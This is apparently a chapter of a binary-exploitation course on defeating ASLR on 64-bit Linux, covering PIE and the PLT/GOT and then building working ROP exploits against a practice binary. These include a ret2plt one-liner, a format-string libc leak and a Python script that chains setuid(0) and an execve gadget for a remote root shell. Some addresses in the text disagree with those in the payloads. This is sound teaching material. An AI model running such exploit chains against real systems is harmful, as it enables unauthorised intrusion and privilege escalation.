# 64 bit ROP With ASLR

sources:
https://www.ret2rop.com/2018/08/return-to-plt-got-to-bypass-aslr-remote.html \
https://www.slideshare.net/inaz2/rop-illmatic-exploring-universal-rop-on-glibc-x8664-en-41595384 \
https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR.pdf \
https://www.blackhat.com/docs/asia-16/materials/asia-16-Marco-Gisbert-Exploiting-Linux-And-PaX-ASLRS-Weaknesses-On-32-And-64-Bit-Systems.pdf \
https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html \
http://shell-storm.org/talks/ROP_course_lecture_jonathan_salwan_2014.pdf \
https://exploit.courses/files/bfh2019/day5/0x53_ExploitMitigations_PIE.pdf \
https://ironhackers.es/en/tutoriales/pwn-rop-bypass-nx-aslr-pie-y-canary/ \
https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html \
https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html \
http://blog.k3170makan.com/2018/11/introduction-to-elf-format-part-vii.html \
http://inaz2.hatenablog.com/entry/2014/10/12/191047 \
https://dangokyo.me/2018/01/27/extra-exploitation-technique-return-to-dl_resolve/ \
https://cs155.stanford.edu/papers/formatstring-1.2.pdf \
https://www.youtube.com/watch?v=t1LH9D5cuK4&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=20

Until now, we exploited without ASLR. Everytime
we got the address for a gadget or function in our
program or a loaded library, we knew it would be the
same when we launched our program again.

With ASLR, the addresses are randomized everytime
the program is run (hence the name Address Space
Layout Randomization). This means that even though
we got an address for a gadget or function under `gdb`,
that doesn't mean it will have the same address outside
`gdb`, or even in `gdb` again!

However, to randomize the address of a library or executable,
they need to have been compiled to position independent code. `libc`
does this, but sometimes executables do not (they use the `-no-pie`
flag).

To summarize: ASLR randomize the stack, the heap, libraries with
position independent code and the executable image if it also has
position independent code.

## Key Concepts

### PIE and PLT

#### PIE

`PIE` means Position Independet Executable. This
option is enabled by default and can be deactivated
with the `-no-pie` compilation flag.

What `PIE` does is produce code refer to resources
and addresses using a offset or other techniques. This
way the code can be placed anywhere in memory, since it
doesn't assume a fixed address for anything.

By using `-no-pie`, all the address in the executable
itself are always the same between executions, but with
ASLR, libc and other libraries are loaded to random addresses.

We will try to make a exploit only from what we can find in the
executable.

#### PLT

In the above explanation for `PIE`, we said that it
uses "offset or other techniques". One of these
"other techniques" is `PLT`.

`PLT` (Procedure Linkage Table) is a section always present
in the executable. What it does is create "stub" functions
for library functions.

These "stub" function are what we see in `gdb` and
`objdump` as `system@plt` or `printf@plt`. When we call
`<function>@plt` we aren't calling `<function>`, we are
jumping to the PLT section and from there being redirected
to the function.

##### PLT Under The Hood

If you launch `gdb rip` and catch a break at main, you 
can use `ni` to go to a `call <function>@plt` instruction
and use `si` to go inside it, to see how it is performed
at a lower level.

You should jump to three lines of instructions that look
like these:

```
Dump of assembler code for function puts@plt:
=> 0x00000000004004b0 <+0>:	jmp    QWORD PTR [rip+0x200b6a]        # 0x601020
   0x00000000004004b6 <+6>:	push   0x1
   0x00000000004004bb <+11>:	jmp    0x400490

```

This code is inside the `PLT` section. We can see that the
first instruction is a jump to the address stored at `rip+0x200b6a`.

Whatever address there is at `rip+0x200b6a`, it is the one we will
execute next. `rip+0x200b6a` or whatever address it happens to be
always belongs to the `GOT` section (Global Offset Table).

Obs.: Actually it is the `.got.plt` section, but you can ignore
that for now.

When we first call `<function>@plt`, the address we jump to is
actually the `push` instruction you see right below the first
`jmp` instruction:

```
   0x00000000004004b6 <+6>:	push   0x1
```

Why are we pushing a `0x1`? Every function called with the `PLT`
is associated with a number, in this case `puts@plt` is associated
with `0x1`.

After that, we jump to `0x400490`:

```
   0x00000000004004bb <+11>:	jmp    0x400490
```

And this doesn't take us to `puts`, why? Because we don't know
where `puts` is yet! This will execute some linker code that will
load the address of `puts` to the `GOT`.

Where exactly in the `GOT`? `rip+0x200b6a`. This way, next time
we call `puts@plt`, we will jump directly to the actual `puts`
function.

In short, the `PLT` is used to find and call
library functions that are randomly loaded somewhere.

## Plan of Attack

There are mainly two ways to defeat ASLR:

1. use anti ASLR resources (like executables addresses if using `-no-pie`)

2. get pointer leak (to find relevant addresses during execution)

It is tough to make a generalized attack that can work in multiple
situations, so we will take for granted some aspects about the
executable when necessary. 

One assumption we make in all these cases is that the program takes
the input as a stream of bytes (we can freely use the null byte).

We also are going to use the `-no-pie` flag for the programs. Next
module, where we also see how to defeat the stack canary, we will be
using `PIE`.

For now, the exploits depend on the `-no-pie` configuration:

* [No PIE, No Libc, No Problem](#no-pie-no-libc-no-problem)

* [Leaking Our Way To Libc](#leaking-our-way-to-libc)

## No PIE, No Libc, No Problem

Using the `PLT` we can easily return to any function used in a
`-no-pie` compiled executable. Let's try calling `system@plt`
with "/bin/sh" as argument.

For that we will need to find:

* `system@plt`

* "/bin/sh"

* `pop rdi; ret`

### `system@plt`

To get the `system@plt` address, one easy way of doing it is
with `objdump -M intel -D rip | grep system@plt`:

```
0000000000400580 <system@plt>:
  4006c1:	e8 ba fe ff ff       	call   400580 <system@plt>
```

Now we know the `system@plt` address is `0x400580`.

### "/bin/sh"

Now we need to find a "/bin/sh" string in the executable. We can
easily check the constant strings in the executable with
`readelf -p .rodata rip` and filter our results with `grep`. By using
`readelf -p .rodata rip | grep "/bin/sh" we get`:

```
```

Well... nothing. But we can also try just "sh", since "/bin/sh"
is usually also in the PATH. `readelf -p .rodata rip | grep sh`
returns:

```
  [    35]  secret_hash
  [    58]  i don't feel like giving you a shell though
```

The second result doesn't work. We would be invoking
`shell though`, which doesn't really do anything.

The first result though, can be used! To get the exact address of
the `sh` substring, we just need to add `0x35` + `0x9` = `0x3e`
(offset of `secret_hash` to the beginning of the `rodata` section
and offset of `sh` substring to the beginning of `secret_hash`).

Now we just need to add `0x3e` to the offset of the `rodata` section
from the beginning of the executable, which we can get with 
`readelf --sections rip | grep rodata`:

```
  [15] .rodata           PROGBITS         0000000000400830  00000830
```

`0x400830` + `0x3e` = `0x40086e`

### `pop rdi`

At this point, we already this over and over. Just use `objdump` and
`grep` to get the gadget. If i use
`objdump -D -M intel rip | grep -A 1 "pop.*rdi" | grep -B 1 ret` i get:

```
```

Well... nothing. Looks like this will be more complicated.

Let's take a closer look at the output from
`objdump -M intel -D rip | grep pop`:

```
400292:	5f                   	pop    rdi
4003ee:	5f                   	pop    rdi
4003fa:	5f                   	pop    rdi
400400:	5f                   	pop    rdi
400401:	5f                   	pop    rdi
400407:	43 5f                	rex.XB pop r15
400440:	5b                   	pop    rbx
4005c5:	5e                   	pop    rsi
40060f:	5d                   	pop    rbp
400620:	5d                   	pop    rbp
40065d:	5d                   	pop    rbp
400668:	5d                   	pop    rbp
400682:	5d                   	pop    rbp
4006b0:	5d                   	pop    rbp
4006c7:	5d                   	pop    rbp
40080a:	5b                   	pop    rbx
40080b:	5d                   	pop    rbp
40080c:	41 5c                	pop    r12
40080e:	41 5d                	pop    r13
400810:	41 5e                	pop    r14
400812:	41 5f                	pop    r15
```

We can see in the middle column the opcodes for the commands.
The gadget that is relevant to us `pop rdi` has the opcode
`5f`, so let's try finding gadgets with the opcode `5f`
with `objdump -D -M intel rip | grep -A 1 5f | grep -B 1 ret`:

```
  400812:	41 5f                	pop    r15
  400814:	c3                   	ret  
```

At first glance, that is not the gadget we are looking for,
but in reality the gadget we want really is just `5f` followed
by `c3` (pop rdi; ret). So we can just use `0x4007b3` to get the
`5f c3` sequence.

### Putting It All Together

Our payload should look like this:

```
fill buufer + pop rdi; ret + "sh" + system@plt
```

Putting it all in a one-liner give us:

```
(python3 -c "__import__('sys').stdout.buffer.write(b'A' * 0x80 + b'BBBBBBBB' + b'\xb3\x07\x40\x00\x00\x00\x00\x00' + b'\x0e\x08\x40\x00\x00\x00\x00\x00' + b'\x40\x05\x40\x00\x00\x00\x00\x00')"; cat ) | ./rip
```

## Leaking Our Way To Libc

In the [previous](#no-pie-no-libc-no-problem) section we
managed to get a shell only using resources from the 
executable. However, there was no way to get root with
only that.

To do so, we need to defeat ASLR and be able to use
libc functions again, to call functions like
`setuid` and `execve`.

How we do it? Two words: Information Disclosure.

We need to find a vulnerability in the program that
let us get addresses from `libc`, from that we can get
the libc version (if we didn't have that info already) and
the offset for any function on it.

As we saw before in the [key concepts](#key-concepts) section,
the address of dynamic linked functions are kept in the `GOT`
after they are called for the first time.

In this section we will:

* [Leak Pointers From Libc](#leaking-pointers-from-libc) (with `gdb`)

* [Ret2Vuln](#return-to-vuln) (execute vulnerable function more than once)

* [Make a Rop Chain With Leaked Info](#make-rop-chain-with-leaked-info)

### Leaking Pointers From Libc (With `gdb`)

Since for now we only know the addresses of resources in the
executable, let's use them for leaking the info.

We can use `printf` to print information from addresses
relative to the stack.

#### Format Strings

You may know we can use "%d" to print integers and "%s" to
print strings, but we can also use "%5$d" to print the
fifth argument given to printf (aside from the format
stirng itself) as a integer.

The System V ABI says that the first pointer or integer
arguments to a function must be given through
`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`. If more than
6 arguments of this type are given, they must be given
through the stack.

In other words, we can use "6$" (or "7$" and so on) in
the format string to print a value from the stack.

#### Leaking Libc Pointers

Let's launch `gdb rip`. As an input we will use
`%p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p`.

Check if any of the addresses in the output belong to
`libc`. You can check the range of addresses belonging to
`libc` with `info proc map`.

obs.: You can them print only this address using the
"%\<n\>$p" trick. Try it out!

Use `x/i <address you leaked>` to see what function it
belongs to, for example, i got:

```
(gdb) x/i 0x7fdc235802e1
   0x7fdc235802e1 <__libc_start_main+241>:	mov    edi,eax
```

Now i need to subtract `241` fromt the address to get
the `__libc_start_main`.

Then, subtract the `libc` base address (found with `info proc map`)
from the address i got, to know `__libc_start_main` offset from the
beginning of the `libc` library address.

No matter where ASLR loads `libc`, the offsets are always the
same. So using them, we could get the `libc` version using tools
like [libc.blukat.me](https://libc.blukat.me) or
[libc-database](https://github.com/niklasb/libc-database).

Why know the version? Because we can get interesting offsets from it!
Like the `setuid` function address of the [`execve` gadget that give us
a shell](../second/second.md/#one-gadget-to-rule-them-all).

I got that for my version of `libc`, `__libc_start_main` is at offset
`0x201f0`.

#### Using Leaked Pointers

Since the offset from `__libc_start_main+241` is always the same, we can
calculate the `libc` base address once we know the address of
`__libc_start_main+241`.

If we know the base address and the version, we know the address of every
single function in `libc`!

There is only one problem: We only get to input once. Once we leak the
address, the program prints some stuff and quits. We need to change that!

### Return to Vuln

To solve this issue, we will execute the vulnerable function,
`password_is_correct`, more than once.

We just need to overwrite the return address of the `password_is_correct`
with its own initial address.

#### Get Vuln Address

With `objdump -M intel -D rip | grep "<password_is_correct>:"`, get the
address of `password_is_correct`:

```
00000000004006c9 <password_is_correct>:
```

#### Overwrite RIP

Just overwrite RIP like we did many times before. Our payload should look
something like this:

```
fill buffer (0x80 bytes) + overwrite RBP (0x8 bytes) + overwrite RIP (0x8 bytes)
```

### Make ROP Chain With Leaked Info

The idea is to make the following rop chain:

```
pop rdi; ret + 0 + setuid + execve gadget
```

We can get the `pop rdi; ret` gadget from the executable itself, just like did
in the [previous](#no-pie-no-libc-no-problem) section.

What is left is the `setuid` and `execve` gadget addresses.

### Getting The Offsets

In the end, we wll have a script that reads the leaked address and calculate the
relevant addresses based on it.

For that, we need to know the offset of the code we want to use.

We need to find the offset of the `execve` gadget we used in the
[previous](../second/second.md/#one-gadget-to-rule-them-all) module and the
`setuid`.

With the same version of `libc` that our victim program is using, we will use
`objdump -M intel libc.so | grep -B 5 execve | grep -C 3 </bin/sh offset in this version of libc>`

This should give you an output like:

```
   b8c07:	48 89 ca             	mov    rdx,rcx
   b8c0a:	e8 81 b2 fc ff       	call   83e90 <memcpy@GLIBC_2.2.5>
   b8c0f:	48 8d 3d 03 90 0a 00 	lea    rdi,[rip+0xa9003]        # 161c19 <_libc_intl_domainname@@GLIBC_2.2.5+0x159>
   b8c16:	4c 89 e2             	mov    rdx,r12
   b8c19:	4c 89 ee             	mov    rsi,r13
   b8c1c:	e8 1f fa ff ff       	call   b8640 <execve@@GLIBC_2.2.5>
--
   d6b9a:	e8 81 53 00 00       	call   dbf20 <__close@@GLIBC_2.2.5>
   d6b9f:	48 8b 05 12 23 2c 00 	mov    rax,QWORD PTR [rip+0x2c2312]        # 398eb8 <__environ@@GLIBC_2.2.5-0x3080>
   d6ba6:	48 8d 74 24 60       	lea    rsi,[rsp+0x60]
   d6bab:	48 8d 3d 67 b0 08 00 	lea    rdi,[rip+0x8b067]        # 161c19 <_libc_intl_domainname@@GLIBC_2.2.5+0x159>
   d6bb2:	48 8b 10             	mov    rdx,QWORD PTR [rax]
   d6bb5:	e8 86 1a fe ff       	call   b8640 <execve@@GLIBC_2.2.5>
```

I will use the `0xd6b9f` offset to call it. In the script, all we gotta do is
add the `libc` base address ot the  offset.

To get the `setuid`, use `objdump -M intel -D rip | grep setuid`:

```
00000000000b8fa0 <setuid@@GLIBC_2.2.5>:
   b8fa8:	75 2e                	jne    b8fd8 <setuid@@GLIBC_2.2.5+0x38>
   b8fb9:	77 05                	ja     b8fc0 <setuid@@GLIBC_2.2.5+0x20>
```

And we got the offset: `0xb8fa0`.

All we need to do now is put it all together in a script.

### Putting In All Together

I decided to run the victim program in a server with `netcat`. To get the server
running you just need to do `sudo busybox nc -llp 65000 -e "./rip"` (sudo is only
necessary if you want to get a root shell).

obs.: be aware that sometimes there are more than one version of `netcat` in the system.
My system comes with `busybox netcat`, `netcat.openbsd` and `netcat.traditional`. Check the
`--help` option in the one you are using to figure out its options.

obs2.: be aware that some `netcat` version don't spawn persistent servers (if you stop talking
to the server it doesn't close).

The exploit itself uses `telnetlib` to send and receive data and hand the control of the connection
directly to us once we get a shell:

```
import struct
from telnetlib import Telnet
import socket

pack = lambda x: struct.pack("Q", x)

def leaker_payload():

    leak_payload = b'%27$p' # leak __libc_start_main+241
    leak_payload += b'A' * (0x80 - len(leak_payload)) # fill buffer
    leak_payload += b'BBBBBBBB' # rbp
    leak_payload += pack(0x4006c9) # return to vuln (password_is_correct)

    return leak_payload

def get_libc_base(__libc_start_main_241):

    __libc_start_main_241 = int(__libc_start_main_241, 16)
    libc_base = __libc_start_main_241 - 241 - 0x201f0

    return libc_base

def root_shell(libc_base):

    libc_base = int(libc_base)
    execve = pack(libc_base + 0xd6b9f) # execve offset
    setuid = pack(libc_base + 0xb8fa0) # setuid offset
    pop_rdi = pack(0x400813) # pop rdi, from the executable

    return b'A' * 0x80 + b'BBBBBBBB' + pop_rdi + pack(0) + setuid + execve

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

skt.connect(('localhost', 65000))

server = Telnet()
server.sock = skt

server.read_until(b'insert the password: ')

print("[!] sending leak payload")
server.write(leaker_payload())

leakage = server.read_until(b'\n')

libc_base = get_libc_base(str(leakage).split('your input: 0x')[1].split('AAAAA')[0])

print("[+] libc base address: ", hex(libc_base))

print("[!] sending root payload")
server.write(root_shell(libc_base))
server.interact()

server.close()
```
